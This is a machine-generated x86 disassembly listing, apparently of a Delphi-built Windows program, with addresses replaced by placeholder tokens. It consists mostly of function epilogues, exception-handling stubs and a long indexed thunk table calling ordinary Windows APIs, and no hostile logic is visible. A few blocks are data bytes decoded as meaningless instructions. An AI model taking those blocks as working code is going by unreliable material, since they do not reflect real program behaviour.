push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46732c
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_467338
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_4185b0
pop esi
pop ebx
retn
sub_46734c
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_467368
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4185b0
pop esi
pop ebx
retn
sub_46737c
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_467384
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4185b0
pop esi
pop ebx
retn
sub_467398
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_467474
mov eax [ eax + 0x54 ]
call sub_418454
retn
sub_467480
mov eax [ eax + 0x54 ]
call sub_41874c
retn
sub_4676d3
jmp sub_4038d0
sub_467717
jmp sub_4038d0
sub_46771e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_46776c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46756c
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403fa4
pop esi
pop ebx
retn
sub_4677d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4185b0
pop esi
pop ebx
retn
sub_4677ec
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_4679f1
jmp sub_4038d0
sub_4679f8
pop ebx
mov esp ebp
pop ebp
retn
sub_467a00
inc [ eax + 0x8c ]
retn
sub_467a08
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_467a28
sub_467a28
xor edx edx
call sub_467e6c
retn
sub_467e5e
jmp sub_4038d0
sub_467ee5
jmp sub_4038d0
sub_467ef4
add eax 0x30
call sub_40d130
retn
sub_467f38
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_467f89
jmp sub_40361c
sub_467f8e
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_46988c
call sub_403984
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_46865d
jmp sub_4038d0
sub_468664
pop ebx
mov esp ebp
pop ebp
retn
sub_4687ec
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_468818
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_468844
xor edx edx
call sub_46873c
retn
sub_46884c
mov dl 0x1
call sub_46873c
retn
sub_4688c0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4688d8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4689a5
jmp sub_4038d0
sub_4689ac
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_40361c#5
jmp sub_40361c
sub_4696f4
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_40361c#4
jmp sub_40361c
j_sub_40361c#3
jmp sub_40361c
sub_46986a
jmp sub_4038d0
sub_469871
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469878
call sub_40cc80
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_469a71
jmp sub_4038d0
sub_469a78
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_469b3f
jmp sub_4038d0
sub_469b46
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469d1c
jmp sub_4038d0
sub_469d23
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469d84
jmp sub_4038d0
sub_469d8b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469d94
call sub_469b5c
retn
sub_469f7f
jmp sub_40361c
sub_469fd8
jmp sub_4038d0
sub_469fdf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a10d
jmp sub_4038d0
sub_46a26c
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_46a56b
jmp sub_4038d0
sub_46a59a
jmp sub_4038d0
sub_46a6a6
jmp sub_4038d0
sub_46a6ad
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46aa3e
jmp sub_4038d0
sub_46aa45
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ab68
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46abb3
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_46abc4
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_46abd4
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_46ac47
jmp sub_4038d0
sub_46ac4e
pop ebp
retn
sub_46ac50
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_46abe4
call sub_403ca0
call sub_46ab68
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_460900
call sub_417f18
sub_46b85d
jmp sub_4038d0
sub_46b864
pop ebp
retn
sub_46b868
sub [ rw-data ] 0x1
retn
sub_46bb5d
jmp sub_4038d0
sub_46bb64
pop ebp
retn
sub_46bb68
sub [ rw-data ] 0x1
retn
sub_46bc88
jmp sub_4038d0
sub_46bcc0
push 0x0
push rw-data
call InterlockedExchange
test eax eax
je r-xdata
retn
push eax
call FreeLibrary
call sub_46cb20
sub_46bcdc
mov eax 0x0
call sub_46ca6c
jmp eax
sub_46bce8
retn
sub_46bcec
mov eax 0x1
call sub_46ca6c
jmp eax
sub_46bcf8
retn
sub_46bcfc
mov eax 0x2
call sub_46ca6c
jmp eax
sub_46bd08
retn
sub_46bd0c
mov eax 0x3
call sub_46ca6c
jmp eax
sub_46bd18
retn
sub_46bd1c
mov eax 0x4
call sub_46ca6c
jmp eax
sub_46bd28
retn
sub_46bd2c
mov eax 0x5
call sub_46ca6c
jmp eax
sub_46bd38
retn
sub_46bd3c
mov eax 0x6
call sub_46ca6c
jmp eax
sub_46bd48
retn
sub_46bd4c
mov eax 0x7
call sub_46ca6c
jmp eax
sub_46bd58
retn
sub_46bd5c
mov eax 0x8
call sub_46ca6c
jmp eax
sub_46bd68
retn
sub_46bd6c
mov eax 0x9
call sub_46ca6c
jmp eax
sub_46bd78
retn
sub_46bd7c
mov eax 0xa
call sub_46ca6c
jmp eax
sub_46bd88
retn
sub_46bd8c
mov eax 0xb
call sub_46ca6c
jmp eax
sub_46bd98
retn
sub_46bd9c
mov eax 0xc
call sub_46ca6c
jmp eax
sub_46bda8
retn
sub_46bdac
mov eax 0xd
call sub_46ca6c
jmp eax
sub_46bdb8
retn
sub_46bdbc
mov eax 0xe
call sub_46ca6c
jmp eax
sub_46bdc8
retn
sub_46bdcc
mov eax 0xf
call sub_46ca6c
jmp eax
sub_46bdd8
retn
sub_46bddc
mov eax 0x10
call sub_46ca6c
jmp eax
sub_46bde8
retn
sub_46bdec
mov eax 0x11
call sub_46ca6c
jmp eax
sub_46bdf8
retn
sub_46bdfc
mov eax 0x12
call sub_46ca6c
jmp eax
sub_46be08
retn
sub_46be0c
mov eax 0x13
call sub_46ca6c
jmp eax
sub_46be18
retn
sub_46be1c
mov eax 0x14
call sub_46ca6c
jmp eax
sub_46be28
retn
sub_46be2c
mov eax 0x15
call sub_46ca6c
jmp eax
sub_46be38
retn
sub_46be3c
mov eax 0x16
call sub_46ca6c
jmp eax
sub_46be48
retn
sub_46be4c
mov eax 0x17
call sub_46ca6c
jmp eax
sub_46be58
retn
sub_46be5c
mov eax 0x18
call sub_46ca6c
jmp eax
sub_46be68
retn
sub_46be6c
mov eax 0x19
call sub_46ca6c
jmp eax
sub_46be78
retn
sub_46be7c
mov eax 0x1a
call sub_46ca6c
jmp eax
sub_46be88
retn
sub_46be8c
mov eax 0x1b
call sub_46ca6c
jmp eax
sub_46be98
retn
sub_46be9c
mov eax 0x1c
call sub_46ca6c
jmp eax
sub_46bea8
retn
sub_46beac
mov eax 0x1d
call sub_46ca6c
jmp eax
sub_46beb8
retn
sub_46bebc
mov eax 0x1e
call sub_46ca6c
jmp eax
sub_46bec8
retn
sub_46becc
mov eax 0x1f
call sub_46ca6c
jmp eax
sub_46bed8
retn
sub_46bedc
mov eax 0x20
call sub_46ca6c
jmp eax
sub_46bee8
retn
sub_46beec
mov eax 0x21
call sub_46ca6c
jmp eax
sub_46bef8
retn
sub_46befc
mov eax 0x22
call sub_46ca6c
jmp eax
sub_46bf08
retn
sub_46bf0c
mov eax 0x23
call sub_46ca6c
jmp eax
sub_46bf18
retn
sub_46bf1c
mov eax 0x24
call sub_46ca6c
jmp eax
sub_46bf28
retn
sub_46bf2c
mov eax 0x25
call sub_46ca6c
jmp eax
sub_46bf38
retn
sub_46bf3c
mov eax 0x26
call sub_46ca6c
jmp eax
sub_46bf48
retn
sub_46bf4c
mov eax 0x27
call sub_46ca6c
jmp eax
sub_46bf58
retn
sub_46bf5c
mov eax 0x28
call sub_46ca6c
jmp eax
sub_46bf68
retn
sub_46bf6c
mov eax 0x29
call sub_46ca6c
jmp eax
sub_46bf78
retn
sub_46bf7c
mov eax 0x2a
call sub_46ca6c
jmp eax
sub_46bf88
retn
sub_46bf8c
mov eax 0x2b
call sub_46ca6c
jmp eax
sub_46bf98
retn
sub_46bf9c
mov eax 0x2c
call sub_46ca6c
jmp eax
sub_46bfa8
retn
sub_46bfac
mov eax 0x2d
call sub_46ca6c
jmp eax
sub_46bfb8
retn
sub_46bfbc
mov eax 0x2e
call sub_46ca6c
jmp eax
sub_46bfc8
retn
sub_46bfcc
mov eax 0x2f
call sub_46ca6c
jmp eax
sub_46bfd8
retn
sub_46bfdc
mov eax 0x30
call sub_46ca6c
jmp eax
sub_46bfe8
retn
sub_46bfec
mov eax 0x31
call sub_46ca6c
jmp eax
sub_46bff8
retn
sub_46bffc
mov eax 0x32
call sub_46ca6c
jmp eax
sub_46c008
retn
sub_46c00c
mov eax 0x33
call sub_46ca6c
jmp eax
sub_46c018
retn
sub_46c01c
mov eax 0x34
call sub_46ca6c
jmp eax
sub_46c028
retn
sub_46c02c
mov eax 0x35
call sub_46ca6c
jmp eax
sub_46c038
retn
sub_46c03c
mov eax 0x36
call sub_46ca6c
jmp eax
sub_46c048
retn
sub_46c04c
mov eax 0x37
call sub_46ca6c
jmp eax
sub_46c058
retn
sub_46c05c
mov eax 0x38
call sub_46ca6c
jmp eax
sub_46c068
retn
sub_46c06c
mov eax 0x39
call sub_46ca6c
jmp eax
sub_46c078
retn
sub_46c07c
mov eax 0x3a
call sub_46ca6c
jmp eax
sub_46c088
retn
sub_46c08c
mov eax 0x3b
call sub_46ca6c
jmp eax
sub_46c098
retn
sub_46c09c
mov eax 0x3c
call sub_46ca6c
jmp eax
sub_46c0a8
retn
sub_46c0ac
mov eax 0x3d
call sub_46ca6c
jmp eax
sub_46c0b8
retn
sub_46c0bc
mov eax 0x3e
call sub_46ca6c
jmp eax
sub_46c0c8
retn
sub_46c0cc
mov eax 0x3f
call sub_46ca6c
jmp eax
sub_46c0d8
retn
sub_46c0dc
mov eax 0x40
call sub_46ca6c
jmp eax
sub_46c0e8
retn
sub_46c0ec
mov eax 0x41
call sub_46ca6c
jmp eax
sub_46c0f8
retn
sub_46c0fc
mov eax 0x42
call sub_46ca6c
jmp eax
sub_46c108
retn
sub_46c10c
mov eax 0x43
call sub_46ca6c
jmp eax
sub_46c118
retn
sub_46c11c
mov eax 0x44
call sub_46ca6c
jmp eax
sub_46c128
retn
sub_46c12c
mov eax 0x45
call sub_46ca6c
jmp eax
sub_46c138
retn
sub_46c13c
mov eax 0x46
call sub_46ca6c
jmp eax
sub_46c148
retn
sub_46c14c
mov eax 0x47
call sub_46ca6c
jmp eax
sub_46c158
retn
sub_46c15c
mov eax 0x48
call sub_46ca6c
jmp eax
sub_46c168
retn
sub_46c16c
mov eax 0x49
call sub_46ca6c
jmp eax
sub_46c178
retn
sub_46c17c
mov eax 0x4a
call sub_46ca6c
jmp eax
sub_46c188
retn
sub_46c18c
mov eax 0x4b
call sub_46ca6c
jmp eax
sub_46c198
retn
sub_46c19c
mov eax 0x4c
call sub_46ca6c
jmp eax
sub_46c1a8
retn
sub_46c1ac
mov eax 0x4d
call sub_46ca6c
jmp eax
sub_46c1b8
retn
sub_46c1bc
mov eax 0x4e
call sub_46ca6c
jmp eax
sub_46c1c8
retn
sub_46c1cc
mov eax 0x4f
call sub_46ca6c
jmp eax
sub_46c1d8
retn
sub_46c1dc
mov eax 0x50
call sub_46ca6c
jmp eax
sub_46c1e8
retn
sub_46c1ec
mov eax 0x51
call sub_46ca6c
jmp eax
sub_46c1f8
retn
sub_46c1fc
mov eax 0x52
call sub_46ca6c
jmp eax
sub_46c208
retn
sub_46c20c
mov eax 0x53
call sub_46ca6c
jmp eax
sub_46c218
retn
sub_46c21c
mov eax 0x54
call sub_46ca6c
jmp eax
sub_46c228
retn
sub_46c22c
mov eax 0x55
call sub_46ca6c
jmp eax
sub_46c238
retn
sub_46c23c
mov eax 0x56
call sub_46ca6c
jmp eax
sub_46c248
retn
sub_46c24c
mov eax 0x57
call sub_46ca6c
jmp eax
sub_46c258
retn
sub_46c25c
mov eax 0x58
call sub_46ca6c
jmp eax
sub_46c268
retn
sub_46c26c
mov eax 0x59
call sub_46ca6c
jmp eax
sub_46c278
retn
sub_46c27c
mov eax 0x5a
call sub_46ca6c
jmp eax
sub_46c288
retn
sub_46c28c
mov eax 0x5b
call sub_46ca6c
jmp eax
sub_46c298
retn
sub_46c29c
mov eax 0x5c
call sub_46ca6c
jmp eax
sub_46c2a8
retn
sub_46c2ac
mov eax 0x5d
call sub_46ca6c
jmp eax
sub_46c2b8
retn
sub_46c2bc
mov eax 0x5e
call sub_46ca6c
jmp eax
sub_46c2c8
retn
sub_46c2cc
mov eax 0x5f
call sub_46ca6c
jmp eax
sub_46c2d8
retn
sub_46c2dc
mov eax 0x60
call sub_46ca6c
jmp eax
sub_46c2e8
retn
sub_46c2ec
mov eax 0x61
call sub_46ca6c
jmp eax
sub_46c2f8
retn
sub_46c2fc
mov eax 0x62
call sub_46ca6c
jmp eax
sub_46c308
retn
sub_46c30c
mov eax 0x63
call sub_46ca6c
jmp eax
sub_46c318
retn
sub_46c31c
mov eax 0x64
call sub_46ca6c
jmp eax
sub_46c328
retn
sub_46c32c
mov eax 0x65
call sub_46ca6c
jmp eax
sub_46c338
retn
sub_46c33c
mov eax 0x66
call sub_46ca6c
jmp eax
sub_46c348
retn
sub_46c34c
mov eax 0x67
call sub_46ca6c
jmp eax
sub_46c358
retn
sub_46c35c
mov eax 0x68
call sub_46ca6c
jmp eax
sub_46c368
retn
sub_46c36c
mov eax 0x69
call sub_46ca6c
jmp eax
sub_46c378
retn
sub_46c37c
mov eax 0x6a
call sub_46ca6c
jmp eax
sub_46c388
retn
sub_46c38c
mov eax 0x6b
call sub_46ca6c
jmp eax
sub_46c398
retn
sub_46c39c
mov eax 0x6c
call sub_46ca6c
jmp eax
sub_46c3a8
retn
sub_46c3ac
mov eax 0x6d
call sub_46ca6c
jmp eax
sub_46c3b8
retn
sub_46c3bc
mov eax 0x6e
call sub_46ca6c
jmp eax
sub_46c3c8
retn
sub_46c3cc
mov eax 0x6f
call sub_46ca6c
jmp eax
sub_46c3d8
retn
sub_46cb0f
jmp sub_4038d0
sub_46cb16
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46cc11
jmp sub_4038d0
sub_46cc18
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46cc7c
jmp sub_4038d0
sub_46cc83
pop ebp
retn
sub_46cc88
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_46cb20
sub_46ccbd
jmp sub_4038d0
sub_46ccc4
pop ebp
retn
sub_46ccc8
sub [ rw-data ] 0x1
retn
sub_46cf54
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_46cf60
retn
sub_46d007
jmp sub_4038d0
sub_46d00e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46d066
jmp sub_4038d0
sub_46d06d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d074
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46d094
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0xc ]
retn
sub_46d512
jmp sub_4038d0
sub_46d519
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d60b
jmp sub_4038d0
sub_46d612
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_46d6a0
jmp sub_4038d0
sub_46d6a7
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46d6d5
jmp sub_4038d0
sub_46d6dc
pop ebp
retn
sub_46d6e0
sub [ rw-data ] 0x1
retn
sub_46d8da
jmp sub_4038d0
sub_46d8e1
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46d9bc
jmp sub_4038d0
sub_46d9c3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46da57
jmp sub_4038d0
sub_46da5e
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46dad4
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46dc18
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46dccb
jmp sub_4038d0
sub_46dcd2
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_46ddad
jmp sub_4038d0
sub_46ddb4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46dfa0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46dfac
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_46dfc4
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46dfd0
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_403748
jmp sub_403748
sub_46e051
add [ eax ] eax
add [ eax ] al
aam 0x76
inc eax
add [ ebp - 0x20 ] bl
inc esi
add [ ebx + 0x4589fc45 ] cl
hlt
sub_46e0a9
jmp sub_4038d0
sub_46e0b0
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e19e
jmp sub_40361c
sub_46e1d9
jmp sub_4038d0
sub_46e1e0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e1ec
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46e1f8
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46e29e
jmp sub_4038d0
sub_46e2a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e361
jmp sub_4038d0
sub_46e368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e385
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_46e37e
jmp sub_4038d0
sub_46e385
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_46e453
jmp sub_4038d0
sub_46e45a
pop ebx
mov esp ebp
pop ebp
retn
sub_46e463
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx + 0x52 ] dl
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46e506
jmp sub_4038d0
sub_46e50d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46e5a6
jmp sub_4038d0
sub_46e5ad
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46e632
jmp sub_4038d0
sub_46e639
pop ecx
pop ebp
retn
sub_46e63c
mov eax [ eax + 0x4 ]
retn
sub_46e69a
jmp sub_4038d0
sub_46e6a1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46e77d
jmp sub_4038d0
sub_46e784
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e7c5
jmp sub_4038d0
sub_46e7cc
pop ebp
retn
sub_46e7d0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ sub_46d6e8 ]
mov [ eax ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_46e2c8
sub_46e821
jmp sub_4038d0
sub_46e828
pop ebp
retn
sub_46e82c
sub [ rw-data ] 0x1
retn
sub_46e9e8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c340
pop esi
pop ebx
retn
sub_46e9fc
cmp edx eax
jge r-xdata
retn
mov eax edx
sub_46eb47
jmp sub_4038d0
sub_46eb4e
pop ebx
pop ecx
pop ebp
retn
sub_46ec1d
jmp sub_4038d0
sub_46ec24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46ecec
push ebx
mov ebx eax
call GetCurrentThreadId
cmp eax [ ebx + 0x8 ]
sete al
pop ebx
retn
sub_46ed04
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
sete al
retn
sub_46ed18
call sub_420ce0
retn
sub_46ed20
call sub_404554
retn
sub_46eef3
jmp sub_4038d0
sub_46eefa
pop ebp
retn
sub_46efcf
jmp sub_4038d0
sub_46efd6
pop ecx
pop ebp
retn
sub_46f104
retn
j_sub_46f104
jmp sub_46f104
sub_46f10c
pop ebp
retn
sub_46f110
sub [ rw-data ] 0x1
retn
sub_46f30f
jmp sub_4038d0
sub_46f316
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46f3f1
jmp sub_4038d0
sub_46f3f8
pop ebp
retn
sub_46f3fc
sub [ rw-data ] 0x1
retn
sub_46f78a
jmp sub_4038d0
sub_46f791
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46f817
jmp sub_4038d0
sub_46f81e
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4034f0
sub_46f8e7
jmp sub_4038d0
sub_46f8ee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46fa18
jmp sub_4038d0
sub_46fa1f
pop ebp
retn
sub_46fa24
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_46f990
call sub_403c78
mov dl 0x1
mov eax [ r-xdata ]
call sub_42be8c
mov [ rw-data ] eax
sub_470098
jmp sub_4038d0
sub_47009f
pop ebx
mov esp ebp
pop ebp
retn
sub_4702c8
jmp sub_4038d0
sub_4702e5
jmp sub_4038d0
sub_4702ec
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4704b5
jmp sub_4038d0
sub_4704bc
mov al [ ebp - 0x1 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4704c8
push ebx
mov ebx eax
mov eax ebx
call sub_419180
mov edx [ r-xdata ]
call sub_403304
mov edx [ ebx + 0x1c ]
mov [ eax + 0x1c ] edx
pop ebx
retn
sub_47055d
jmp sub_4038d0
sub_470564
pop ebp
retn
sub_470568
sub [ rw-data ] 0x1
retn
sub_470958
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_47096c
mov edx [ eax + 0x34 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x44 ]
sub_47097c
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_470990
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_4709c9
jmp sub_4038d0
sub_4709d0
pop ebp
retn
sub_4709d4
sub [ rw-data ] 0x1
retn
sub_470ac0
retn
sub_470ac4
push ebp
mov ebp esp
pop ebp
retn 0x14
sub_470af8
retn
sub_470afc
retn
sub_470b25
jmp sub_4038d0
sub_470b2c
pop ebp
retn
sub_470b30
sub [ rw-data ] 0x1
retn
sub_470d54
push ebx
mov ebx eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebx + 0x14 ]
call sub_403f50
pop ebx
retn
sub_470f31
jmp sub_4038d0
sub_470f38
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47105f
jmp sub_4038d0
sub_471066
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4710db
jmp sub_4038d0
sub_4710e2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4710fc
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4711bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4192f8
pop esi
pop ebx
retn
sub_471225
jmp sub_4038d0
sub_47122c
pop ebp
retn
sub_471230
sub [ rw-data ] 0x1
retn
sub_47125d
jmp sub_4038d0
sub_471264
pop ebp
retn
sub_471268
sub [ rw-data ] 0x1
retn
sub_471771
jmp sub_4038d0
sub_471778
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403748#6
jmp sub_403748
j_sub_403748#7
jmp sub_403748
sub_47199d
jmp [ ecx + rw-data ]
sub_471ac3
jmp sub_40361c
j_sub_40361c#2
jmp sub_40361c
sub_471d45
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471d6a
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_403f74
retn
sub_471d63
jmp sub_4038d0
sub_471d6a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471db5
jmp sub_4038d0
sub_471dbc
pop ebp
retn
sub_471dc0
sub [ rw-data ] 0x1
retn
sub_471e54
or eax 0xffffffff
retn
sub_471e58
push ebx
mov ebx ecx
push 0x0
mov ecx ebx
mov eax [ eax + 0x4 ]
call sub_473aec
mov eax ebx
pop ebx
retn
sub_471e91
jmp sub_4038d0
sub_471e98
pop ebp
retn
sub_471e9c
sub [ rw-data ] 0x1
retn
sub_472124
jmp sub_4038d0
sub_47212b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_472185
jmp sub_4038d0
sub_47218c
pop ebp
retn
sub_472190
sub [ rw-data ] 0x1
retn
sub_4724b1
jmp sub_4038d0
sub_4724b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4724d5
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
sub_4724ce
jmp sub_4038d0
sub_4724d5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4726ad
jmp sub_4038d0
sub_4726b4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_4726c0
mov ecx [ eax + 0x68 ]
test ecx ecx
setne dl
test dl dl
je r-xdata
mov eax edx
retn
mov dl [ ecx + 0x10 ]
sub_472740
mov eax [ eax + 0x68 ]
call sub_4701b4
retn
sub_4727bc
jmp sub_4038d0
sub_4727c3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47283c
jmp sub_4038d0
sub_472843
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403748#2
jmp sub_403748
sub_4729a2
add [ eax ] eax
